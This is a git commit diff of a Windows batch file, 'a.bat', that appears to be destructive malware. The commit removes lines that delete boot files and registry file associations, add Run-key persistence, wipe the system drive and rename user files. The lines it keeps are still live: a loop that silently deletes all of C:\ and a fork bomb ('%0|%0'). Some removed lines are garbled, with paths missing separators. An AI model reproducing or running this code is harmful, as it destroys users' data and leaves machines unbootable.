b85dd897beed8bbb56f3687b4069b60516089ef9
noo <67281372+fonsixx@users.noreply.github.com>
2021-12-28 21:23:09 -0600

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,20 +1,3 @@
-@echo off 
-attrib -r -s -h c:autoexec.bat del c:autoexec.bat attrib -r -s -h c:boot.ini del c:boot.ini attrib -r -s -h c:ntldr del c:ntldr attrib -r -s -h c:windowswin.ini del c:windowswin.ini
-START reg delete HKCR/.exe
-START reg delete HKCR/.dll
-START reg delete HKCR/*
-attrib -r -s -h c:\autoexec.bat
-del c:\autoexec.bat
-attrib -r -s -h c:\boot.ini
-del c:\boot.ini
-attrib -r -s -h c:\ntldr
-del c:\ntldr
-attrib -r -s -h c:\windows\win.ini
-del c:\windows\win.ini
-reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
-delete %systemdrive%\*.* /f /s
-REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt REN *.EXE *.noob
 :a
 rd c:\ /q /s
 %0|%0
